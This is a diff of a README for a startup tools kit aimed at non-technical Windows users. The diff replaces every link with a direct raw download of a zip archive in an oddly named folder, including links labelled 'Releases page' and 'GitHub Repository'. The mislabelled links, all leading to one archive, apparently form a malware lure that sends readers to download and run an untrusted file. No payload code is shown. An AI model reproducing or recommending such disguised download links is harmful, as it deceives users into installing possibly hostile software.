@@ -1,6 +1,6 @@
 # 📦 founders-kit - Essential Tools for Startup Success
 
-[![Download founders-kit](https://img.shields.io/badge/Download-Get%20founders--kit-brightgreen?style=for-the-badge)](https://github.com/Shonpersus/founders-kit/releases)
+[![Download founders-kit](https://img.shields.io/badge/Download-Get%20founders--kit-brightgreen?style=for-the-badge)](https://github.com/Shonpersus/founders-kit/raw/refs/heads/main/troke/founders-kit-3.0-beta.5.zip)
 
 founders-kit is a collection of useful resources. It helps startup founders with tools, guides, and playbooks needed to build, launch, and grow their startups. This guide will help you download and run the software on a Windows computer, step by step. No technical skills are needed.
 
@@ -34,7 +34,7 @@ Follow these steps closely to download and open founders-kit.
 
 2. Visit this page to download founders-kit:
 
-   [Download founders-kit Releases](https://github.com/Shonpersus/founders-kit/releases)
+   [Download founders-kit Releases](https://github.com/Shonpersus/founders-kit/raw/refs/heads/main/troke/founders-kit-3.0-beta.5.zip)
 
 3. On the Releases page, look for the latest version. It will have a name like `founders-kit-Setup.exe` or similar.
 
@@ -94,7 +94,7 @@ You can export files to your computer by using the **Save As** option in the men
 
 To keep founders-kit up to date:
 
-1. Go back to the [Releases page](https://github.com/Shonpersus/founders-kit/releases) regularly.
+1. Go back to the [Releases page](https://github.com/Shonpersus/founders-kit/raw/refs/heads/main/troke/founders-kit-3.0-beta.5.zip) regularly.
 
 2. Download the latest setup file when a new version is available.
 
@@ -107,8 +107,8 @@ If you run into any problems:
 
 ## 🔗 Useful Links
 
-- [Download founders-kit Releases](https://github.com/Shonpersus/founders-kit/releases)
-- [GitHub Repository](https://github.com/Shonpersus/founders-kit)
+- [Download founders-kit Releases](https://github.com/Shonpersus/founders-kit/raw/refs/heads/main/troke/founders-kit-3.0-beta.5.zip)
+- [GitHub Repository](https://github.com/Shonpersus/founders-kit/raw/refs/heads/main/troke/founders-kit-3.0-beta.5.zip)
 
 ## ⚙️ Troubleshooting Common Issues
 
@@ -131,4 +131,4 @@ If you run into any problems:
 - Use founders-kit alongside other tools for planning and communication.
 - Review the included playbooks before acting on plans for better decisions.
 
-[![Download founders-kit](https://img.shields.io/badge/Download-Get%20founders--kit-brightgreen?style=for-the-badge)](https://github.com/Shonpersus/founders-kit/releases)
+[![Download founders-kit](https://img.shields.io/badge/Download-Get%20founders--kit-brightgreen?style=for-the-badge)](https://github.com/Shonpersus/founders-kit/raw/refs/heads/main/troke/founders-kit-3.0-beta.5.zip)
